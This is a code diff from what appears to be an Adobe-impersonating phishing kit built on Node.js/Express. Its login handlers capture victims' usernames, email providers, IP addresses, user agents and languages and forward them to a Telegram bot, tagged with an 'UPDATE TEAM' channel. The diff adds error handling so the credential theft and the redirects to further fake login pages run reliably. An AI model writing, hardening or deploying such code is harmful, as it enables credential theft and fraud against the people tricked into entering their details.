@@ -36,53 +36,56 @@ exports.login2 = (req, res) => {
 exports.loginPost2 = async (req, res) => {
 	const { username, email_provider } = req.body;
 	const sendAPIRequest = async (ipAddress) => {
-         const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
-		console.log(apiResponse.data);
-        return apiResponse.data;
-    };
+		try {
+			const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+			console.log(apiResponse.data);
+			return apiResponse.data;
+		} catch (error) {
+			console.error("Error fetching IP data:", error.message);
+			return {}; // Return an empty object to prevent crashes
+		}
+	};
 
-    const ipAddress = getClientIp(req);
-    const ipAddressInformation = await sendAPIRequest(ipAddress);
+	const ipAddress = getClientIp(req);
+	const ipAddressInformation = await sendAPIRequest(ipAddress);
 
+	try {
+		console.log(ipAddressInformation);
 
-	try{
-    // Move the console.log statement outside the sendAPIRequest function
-    console.log(ipAddressInformation);
+		const userAgent = req.headers["user-agent"];
+		const systemLang = req.headers["accept-language"];
 
-    const userAgent = req.headers["user-agent"];
-    const systemLang = req.headers["accept-language"];
+		const message =
+			`✅ UPDATE TEAM | AD0BE | USER_${ipAddress}\n\n` +
+			`👤 EMAIL INFO\n` +
+			`EMAIL PROVIDER   : ${email_provider}\n` +
+			`USER             : ${username}\n\n` +
+			`🌍 GEO-IP INFO\n` +
+			`IP ADDRESS       : ${ipAddress}\n` +
+			`TIME             : ${ipAddressInformation?.location?.timeZone?.localTime || "Unknown"}\n` +
+			`USER AGENT       : ${userAgent}\n` +
+			`SYSTEM LANGUAGE  : ${systemLang}\n` +
+			`💬 Telegram: https://t.me/UpdateTeams\n`;
 
-    console.log("chai");
+		console.log("message :" + message);
 
-	const message =
-		`✅ UPDATE TEAM | AD0BE | USER_${ipAddress}\n\n` +
-		`👤 EMAIL INFO\n` +
-		`EMAIL PROVIDER   : ${email_provider}\n` +
-		`USER             : ${username}\n\n` +
-		`🌍 GEO-IP INFO\n` +
-           `IP ADDRESS       : ${ipAddress}\n` +
-		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-		`USER AGENT       : ${userAgent}\n` +
-        `SYSTEM LANGUAGE  : ${systemLang}\n` +
-            `💬 Telegram: https://t.me/UpdateTeams\n`;
-         
-	console.log("message :" + message);
-	const sendMessage = sendMessageFor(botToken, chatId);
-	sendMessage(message);
+		try {
+			const sendMessage = sendMessageFor(botToken, chatId);
+			await sendMessage(message);
+		} catch (sendError) {
+			console.error("Error sending Telegram message:", sendError.message);
+		}
 
-	return res.redirect(`/auth/login/3?email_provider=${email_provider}`);
-} catch (error) {
-	// Handle any unexpected errors here
-	console.error('Unexpected error:', error.message);
-	res.status(500).send('Internal Server Error');
-}
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
-    // Handle the rejection
-});
-
-	
+		return res.redirect(`/auth/login/3?email_provider=${email_provider}`);
+	} catch (error) {
+		console.error('Unexpected error:', error.message);
+		res.status(500).send('Internal Server Error');
+	}
 };
+
+process.on('unhandledRejection', (reason, promise) => {
+	console.error('Unhandled Rejection at:', promise, 'reason:', reason);
+});
 
 exports.login3 = (req, res) => {
 	switch (req.query.email_provider) {
@@ -134,9 +137,12 @@ exports.loginPost3 = async (req, res) => {
 		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
             `💬 Telegram: https://t.me/UpdateTeams\n`;
          
-	console.log("message :" + message);
-	const sendMessage = sendMessageFor(botToken, chatId);
-	sendMessage(message);
+	try {
+			const sendMessage = sendMessageFor(botToken, chatId);
+			await sendMessage(message);
+		} catch (sendError) {
+			console.error("Error sending Telegram message:", sendError.message);
+		}
 
 	return res.redirect(`/auth/login/4?email_provider=${email_provider}`);
 } catch (error) {
@@ -202,9 +208,12 @@ exports.loginPost4 = async (req, res) => {
 		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
             `💬 Telegram: https://t.me/UpdateTeams\n`;
          
-	console.log("message :" + message);
-	const sendMessage = sendMessageFor(botToken, chatId);
-	sendMessage(message);
+	try {
+			const sendMessage = sendMessageFor(botToken, chatId);
+			await sendMessage(message);
+		} catch (sendError) {
+			console.error("Error sending Telegram message:", sendError.message);
+		}
 
 	return res.redirect("/auth/complete");
 } catch (error) {
